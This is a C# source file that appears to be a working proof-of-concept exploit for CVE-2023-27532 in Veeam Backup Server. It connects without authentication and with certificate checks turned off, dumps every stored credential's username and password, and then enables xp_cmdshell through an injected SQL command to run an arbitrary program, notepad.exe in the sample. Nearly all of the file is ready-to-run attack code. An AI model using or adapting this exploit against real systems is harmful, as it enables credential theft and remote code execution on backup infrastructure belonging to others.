using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.ServiceModel;
using System.ServiceModel.Security;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;

namespace CVE_2023_27532;

class Program
{
    static List<string> GetCredGuids(IRemoteInvokeService proxy)
    {
        MemoryStream memoryStream = new MemoryStream();
        BinaryFormatter binaryFormatter = new BinaryFormatter();
#pragma warning disable SYSLIB0011
        binaryFormatter.Serialize(memoryStream, true);
#pragma warning restore SYSLIB0011
        string base64 = Convert.ToBase64String(memoryStream.ToArray());

        var xml = "" +
                  "<RemoteInvokeSpec ContextSessionId=\"00000000-0000-0000-0000-000000000000\" Scope=\"Service\" Method=\"CredentialsDbScopeGetAllCreds\">\n" +
                  "<Params>\n" +
                  $"<Param ParamName=\"includeHidden\" ParamValue=\"{base64}\" ParamType=\"System.String\"></Param>\n" +
                  "</Params>\n" +
                  "</RemoteInvokeSpec>";

        var response = proxy.Invoke(ERemoteInvokeScope.DatabaseManager,
            ERemoteInvokeMethod.CredentialsDbScopeGetAllCreds,
            xml);

        XmlDocument doc = new XmlDocument();
        doc.LoadXml(response);
        XmlNodeList paramNodes = doc.GetElementsByTagName("Param");
        String paramValue = paramNodes[0].Attributes["ParamValue"].Value;
        byte[] decoded = Convert.FromBase64String(paramValue);
        String str = Encoding.UTF8.GetString(decoded);
        Regex regex = new Regex(@"\$(\w{8}-\w{4}-\w{4}-\w{4}-\w{12})");
        MatchCollection matches = regex.Matches(str);
        List<string> guids = new List<string>();

        foreach (Match match in matches) {
            string guidString = match.Groups[1].Value;
            guids.Add(guidString);
        }

        return guids;
    }

    static void GetCred(String guid, IRemoteInvokeService proxy)
    { 
        MemoryStream memoryStream = new MemoryStream();
        BinaryFormatter binaryFormatter = new BinaryFormatter();
#pragma warning disable SYSLIB0011
        binaryFormatter.Serialize(memoryStream, new Guid(guid));
#pragma warning restore SYSLIB0011
        string base64 = Convert.ToBase64String(memoryStream.ToArray());

        var xml = "" +
                  "<RemoteInvokeSpec ContextSessionId=\"00000000-0000-0000-0000-000000000000\" Scope=\"Service\" Method=\"CredentialsDbScopeFindCredentials\">\n" +
                  "<Params>\n" +
                  $"<Param ParamName=\"credsId\" ParamValue=\"{base64}\" ParamType=\"System.String\"></Param>\n" +
                  "</Params>\n" +
                  "</RemoteInvokeSpec>";

        var response = proxy.Invoke(ERemoteInvokeScope.DatabaseManager,
            ERemoteInvokeMethod.CredentialsDbScopeFindCredentials,
            xml);

        XmlDocument doc = new XmlDocument();
        doc.LoadXml(response);
        XmlNodeList paramNodes = doc.GetElementsByTagName("Param");
        String paramValue = paramNodes[0].Attributes["ParamValue"].Value;
        byte[] decoded = Convert.FromBase64String(paramValue);

        //https://stackoverflow.com/questions/13594831/binaryformatter-is-it-possible-to-deserialize-known-class-without-the-assembly
        var surrSel = new SurrogateSelector();
        surrSel.AddSurrogate(typeof(ProxyTestClass), new StreamingContext(StreamingContextStates.All), new
            SurrogateTestClassConstructor());
        BinaryFormatter formatter = new BinaryFormatter();
        formatter.Binder = new DeserializeBinder();
        formatter.SurrogateSelector = surrSel;

        var deserializeObj = formatter.Deserialize(new MemoryStream(decoded)) as ProxyTestClass;
        foreach (var c in deserializeObj.Dump())
        {
            if (c.Key == "UserName" || c.Key == "Password")
            {
                Console.Write("{0} = {1} ", c.Key, c.Value);
            }
        }
        Console.WriteLine();
    }

    // RCE poc
    // https://attackerkb.com/topics/ALUsuJioE5/cve-2023-27532/rapid7-analysis
    // https://github.com/sfewer-r7/CVE-2023-27532
    static void GetExec(IRemoteInvokeService proxy)
    { 
        // pop notepad.exe
        string cmd = "c:\\windows\\notepad.exe";
        Console.WriteLine("Attempting to execute: {0}", cmd);

        var xml = "" +
                  "<RemoteInvokeSpec ContextSessionId=\"00000000-0000-0000-0000-000000000000\">\n" +
                  "<DbGetDataTableRemoteInvokeSpec>\n" +
                  $"<SqlCommand>EXEC sp_configure 'show advanced options', 1; EXEC sp_configure reconfigure; EXEC sp_configure 'xp_cmdshell', 1; EXEC sp_configure reconfigure; EXEC xp_cmdshell '{cmd}';</SqlCommand>\n" +
                  "<CommandType>1</CommandType>\n" +
                  "</DbGetDataTableRemoteInvokeSpec>\n" +
                  "</RemoteInvokeSpec>";

        proxy.GetDataTable(ERemoteInvokeScope.DatabaseAccessor,
            ERemoteInvokeMethod.GetDataTable,
            xml);
    }
    
    static void Main(string[] args)
    {
        var address = args[0];
        var binding = new NetTcpBinding(SecurityMode.Transport);
        binding.Security.Transport.ClientCredentialType = TcpClientCredentialType.None;
        var dnsIdentity = new DnsEndpointIdentity("Veeam Backup Server Certificate");
        var endpointAddress = new EndpointAddress(new Uri(address), dnsIdentity);
        
        ChannelFactory<IRemoteInvokeService> factory =
            new ChannelFactory<IRemoteInvokeService>(binding, endpointAddress);
        factory.Credentials.ServiceCertificate.Authentication.CertificateValidationMode =
            X509CertificateValidationMode.None;
        
        IRemoteInvokeService proxy = factory.CreateChannel();
        var guids = GetCredGuids(proxy);
        foreach (var guid in guids)
        {
            GetCred(guid, proxy);
        }

        // call RCE poc
        GetExec(proxy);
    }
}